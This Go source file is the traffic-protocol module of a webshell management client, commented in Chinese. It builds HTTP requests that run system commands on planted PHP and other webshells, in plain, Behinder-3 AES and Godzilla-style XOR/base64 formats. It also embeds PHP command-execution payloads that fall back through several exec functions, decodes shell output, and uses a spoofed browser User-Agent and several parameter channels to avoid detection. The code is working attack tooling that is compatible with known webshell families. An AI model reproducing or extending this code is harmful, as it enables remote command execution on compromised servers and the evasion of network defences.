// Package shell WebShell 流量协议层。
//
// 把「在目标 shell 上执行一条系统命令」这一逻辑请求按协议编译为 HTTP 报文规格
// （方法/URL/Header/Body），并把响应体还原为命令输出原始字节。协议与模板配套：
//
//	plain    : 历史明文行为——密码参数（passParam，缺省 pass）+cmdParam 双参数，
//	           GET query 或 POST form
//	behinder : 冰蝎3式——AES-128-CBC（key=iv=md5(pass) 前 16 位），POST 二进制体，
//	           明文为 eval|<php 代码>；兼容投放给原版冰蝎3 PHP 马（解密后按 | 切分 eval 第二段）
//	godzilla : 哥斯拉式（PHP_XOR_BASE64 变形）——key=md5(pass) 前 16 位，
//	           请求为 base64(xor(php 代码, key)) 二进制体；响应为
//	           base64(xor( md5(key)[16:] + base64(输出) + md5(key)[:16], key ))
//
// 加密协议仅对 PHP 型 shell 提供（客户端执行体与 webshellgen 内置模板成对交付）；
// 其他语言维持 plain。参数通道（param channel）只在 plain 协议下生效，
// 支持 body/query/cookie/header 四种 pass+cmdParam 投放位置。
package protocol

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

// Protocol 流量协议标识。
type Protocol string

const (
	Plain    Protocol = "plain"
	Behinder Protocol = "behinder"
	Godzilla Protocol = "godzilla"
)

// ParamChannel plain 协议下参数投放位置。
type ParamChannel string

const (
	ParamBody   ParamChannel = "body"   // POST form（默认）
	ParamQuery  ParamChannel = "query"  // URL 查询串
	ParamCookie ParamChannel = "cookie" // Cookie 头
	ParamHeader ParamChannel = "header" // 自定义 Header（X- 前缀，pass 为值）
)

// DefaultPassParam plain 协议密码/token 参数名缺省值（与 cmd 的缺省 "cmd" 对称）。
// 历史马普遍约定 pass=密码；外部已有马（如 ?k=token&c=id 形态）按连接配置覆盖。
const DefaultPassParam = "pass"

// MaxURLQueryChars GET 参数串长度上限。Tomcat 等中间件默认 maxHttpHeaderSize 8KB，
// 超限直接 400（印尼演练实测：20KB 命令即触发）。超过阈值的大命令自动降级
// POST form 投递——request.getParameter 系一句话马对 query/form 一视同仁
// （zzsg/zzaceh 家族实测兼容），仅 query-only 的极简壳不受益，而它们对大命令
// 本来也无解，降级只会更好不会更坏。
const MaxURLQueryChars = 7000

// Request 编译出的 HTTP 报文规格。
type Request struct {
	Method string
	URL    string
	Header http.Header
	Body   []byte // nil/空 = 无请求体（GET 语义）
}

// NormalizeProtocol 归一化协议标识；空值默认 plain，未知值报错。
func NormalizeProtocol(s string) (Protocol, error) {
	switch Protocol(strings.ToLower(strings.TrimSpace(s))) {
	case "", Plain:
		return Plain, nil
	case Behinder:
		return Behinder, nil
	case Godzilla:
		return Godzilla, nil
	default:
		return "", fmt.Errorf("unsupported protocol %q (supported: plain, behinder, godzilla)", s)
	}
}

// NormalizeParamChannel 归一化参数通道；空值默认 body，未知值报错。
func NormalizeParamChannel(s string) (ParamChannel, error) {
	switch ParamChannel(strings.ToLower(strings.TrimSpace(s))) {
	case "", ParamBody:
		return ParamBody, nil
	case ParamQuery:
		return ParamQuery, nil
	case ParamCookie:
		return ParamCookie, nil
	case ParamHeader:
		return ParamHeader, nil
	default:
		return "", fmt.Errorf("unsupported param_channel %q (supported: body, query, cookie, header)", s)
	}
}

// SupportsProtocol 该 shell 语言是否有配套的协议执行体/模板。
// 加密协议当前仅内置 PHP 实现（behinder 兼容冰蝎3 PHP 马；godzilla 为自研哥斯拉式）；
// plain 全语言支持。
func SupportsProtocol(p Protocol, shellType string) bool {
	switch p {
	case Behinder, Godzilla:
		return strings.EqualFold(strings.TrimSpace(shellType), "php")
	default:
		return true
	}
}

// DeriveKey 由连接密码派生协议密钥：md5(pass) 十六进制串的前 16 个 ASCII 字节
// （16 字节 = AES-128，同时充当 CBC IV / XOR 轮转 key，与冰蝎/哥斯拉同派生方式）。
func DeriveKey(password string) []byte {
	sum := md5.Sum([]byte(password))
	return []byte(fmt.Sprintf("%x", sum))[:16]
}

// Build 按协议把「执行 command」编译为 HTTP 报文规格。
// plain 下 method 为 GET 时参数走 URL（或显式 channel），POST 时走 body；
// passParam 为密码/token 的参数名（空缺省 "pass"）；
// 加密协议一律 POST 二进制体（method 参数仅 plain 消费）。
func Build(p Protocol, shellType, method, baseURL, password, cmdParam, command, channel, passParam string) (*Request, error) {
	if normalized, nerr := NormalizeProtocol(string(p)); nerr != nil {
		return nil, nerr
	} else {
		p = normalized
	}
	baseURL = strings.TrimSpace(baseURL)
	if baseURL == "" {
		return nil, fmt.Errorf("base url is required")
	}
	password = strings.TrimSpace(password)
	if password == "" {
		return nil, fmt.Errorf("password is required for protocol %s", p)
	}
	if cmdParam = strings.TrimSpace(cmdParam); cmdParam == "" {
		cmdParam = "cmd"
	}
	h := http.Header{}
	h.Set("User-Agent", defaultUA)
	switch p {
	case Plain:
		return buildPlain(method, baseURL, password, cmdParam, command, channel, passParam)
	case Behinder:
		body, err := aesCBCEncrypt([]byte(DeriveKey(password)), []byte("eval|"+phpExecCode(command)))
		if err != nil {
			return nil, err
		}
		h.Set("Content-Type", "application/octet-stream")
		return &Request{Method: http.MethodPost, URL: baseURL, Header: h, Body: body}, nil
	case Godzilla:
		body := base64.StdEncoding.EncodeToString(xorBytes([]byte(phpExecCode(command)), DeriveKey(password)))
		h.Set("Content-Type", "application/octet-stream")
		return &Request{Method: http.MethodPost, URL: baseURL, Header: h, Body: []byte(body)}, nil
	default:
		return nil, fmt.Errorf("unsupported protocol %q", p)
	}
}

// buildPlain 明文协议：密码参数（passParam，空缺省 "pass"）+cmdParam 按参数通道投放
// （默认 POST 走 body、GET 走 query）。
func buildPlain(method, baseURL, password, cmdParam, command, channel, passParam string) (*Request, error) {
	passParam = strings.TrimSpace(passParam)
	if passParam == "" {
		passParam = DefaultPassParam
	}
	form := url.Values{}
	form.Set(passParam, password)
	form.Set(cmdParam, command)
	h := http.Header{}
	if ch, err := NormalizeParamChannel(channel); err == nil && ch != ParamBody {
		switch ch {
		case ParamQuery:
			return appendParamsAsQuery(method, baseURL, form, h)
		case ParamCookie:
			h.Set("Cookie", form.Encode())
			return &Request{Method: http.MethodPost, URL: baseURL, Header: h}, nil
		case ParamHeader:
			h.Set("User-Agent", defaultUA)
			h.Set("X-"+http.CanonicalHeaderKey(cmdParam), command)
			h.Set("X-"+http.CanonicalHeaderKey(passParam), password)
			return &Request{Method: http.MethodPost, URL: baseURL, Header: h}, nil
		}
	}
	if strings.EqualFold(strings.TrimSpace(method), "GET") {
		return appendParamsAsQuery(method, baseURL, form, h)
	}
	h.Set("User-Agent", defaultUA)
	h.Set("Content-Type", "application/x-www-form-urlencoded")
	return &Request{Method: http.MethodPost, URL: baseURL, Header: h, Body: []byte(form.Encode())}, nil
}

// appendParamsAsQuery 把 pass+cmd 拼进 URL query；超过 MaxURLQueryChars 的大命令
// 自动降级 POST form（中间件 header 8KB 上限会 400 掉超长 URL）。
func appendParamsAsQuery(method, baseURL string, form url.Values, h http.Header) (*Request, error) {
	if u, perr := url.Parse(baseURL); perr == nil {
		q := u.RawQuery
		if q != "" {
			q += "&"
		}
		q += form.Encode()
		if len(q) > MaxURLQueryChars {
			// 大命令降级：POST form 投递，URL 只留路径（shell 的 getParameter
			// 对 form/query 等价；显式 query 通道的大命令同样受益）
			h.Set("User-Agent", defaultUA)
			h.Set("Content-Type", "application/x-www-form-urlencoded")
			u.RawQuery = ""
			return &Request{Method: http.MethodPost, URL: u.String(), Header: h, Body: []byte(form.Encode())}, nil
		}
		u.RawQuery = q
		h.Set("User-Agent", defaultUA)
		return &Request{Method: http.MethodGet, URL: u.String(), Header: h}, nil
	}
	return nil, fmt.Errorf("invalid base url: %q", baseURL)
}

// HTTPRequest 把报文规格落地为 *http.Request（调用方补上下文）。
func (r *Request) HTTPRequest() (*http.Request, error) {
	var body io.Reader
	if len(r.Body) > 0 {
		body = bytes.NewReader(r.Body)
	}
	req, err := http.NewRequest(r.Method, r.URL, body)
	if err != nil {
		return nil, err
	}
	for k, vs := range r.Header {
		for _, v := range vs {
			req.Header.Add(k, v)
		}
	}
	return req, nil
}

// Unwrap 把响应体按协议还原为命令输出的原始字节（未做字符集转换）。
// plain 原样返回；behinder 原样返回（模板直接回显输出）；godzilla 走
// base64 → xor → 去前后 16 字节 → base64 四步还原。还原失败时回退原始体
// （配合 response_filter 仍有机会取到输出）。
func Unwrap(p Protocol, password string, body []byte) []byte {
	switch p {
	case Godzilla:
		enc, err := base64.StdEncoding.DecodeString(strings.TrimSpace(string(body)))
		if err != nil || len(enc) < 40 {
			return body
		}
		xored := xorBytes(enc, DeriveKey(password))
		inner := xored[16 : len(xored)-16]
		out, err := base64.StdEncoding.DecodeString(string(inner))
		if err != nil {
			return inner
		}
		return out
	default:
		return body
	}
}

// ApplyResponseFilter 输出后处理：filter 为空原样返回；否则按正则取第一处
// 匹配（有捕获组取组 1，无组取整段匹配）；正则非法或无命中时返回原输出/空串。
func ApplyResponseFilter(out, filter string) string {
	filter = strings.TrimSpace(filter)
	if filter == "" {
		return out
	}
	re, err := regexp.Compile(filter)
	if err != nil {
		return out
	}
	m := re.FindStringSubmatch(out)
	if m == nil {
		return ""
	}
	if len(m) > 1 {
		return m[1]
	}
	return m[0]
}

// phpExecCode 生成加密协议客户端的 PHP 执行体：命令 base64 内嵌，
// system/passthru/shell_exec/exec/popen 逐级降级，输出原样回显。
func phpExecCode(command string) string {
	b64 := base64.StdEncoding.EncodeToString([]byte(command))
	return fmt.Sprintf(`@error_reporting(0);$__c=base64_decode('%s');`+
		`if(function_exists('system')){@system($__c);}`+
		`elseif(function_exists('passthru')){@passthru($__c);}`+
		`elseif(function_exists('shell_exec')){echo @shell_exec($__c);}`+
		`elseif(function_exists('exec')){@exec($__c,$__o);echo implode("\n",(array)$__o);}`+
		`elseif(function_exists('popen')){$__h=@popen($__c,'r');if($__h){while(!feof($__h)){echo fread($__h,4096);}@pclose($__h);}}`, b64)
}

// aesCBCEncrypt AES-128-CBC + PKCS7 填充（key 兼作 IV，冰蝎3 约定）。
func aesCBCEncrypt(key, plain []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("aes init: %w", err)
	}
	pad := block.BlockSize() - len(plain)%block.BlockSize()
	padded := append(plain, bytes.Repeat([]byte{byte(pad)}, pad)...)
	out := make([]byte, len(padded))
	cipher.NewCBCEncrypter(block, key).CryptBlocks(out, padded)
	return out, nil
}

// xorBytes 轮转 XOR（哥斯拉式编码链）。
func xorBytes(b, key []byte) []byte {
	out := make([]byte, len(b))
	for i := range b {
		out[i] = b[i] ^ key[i%len(key)]
	}
	return out
}

const defaultUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
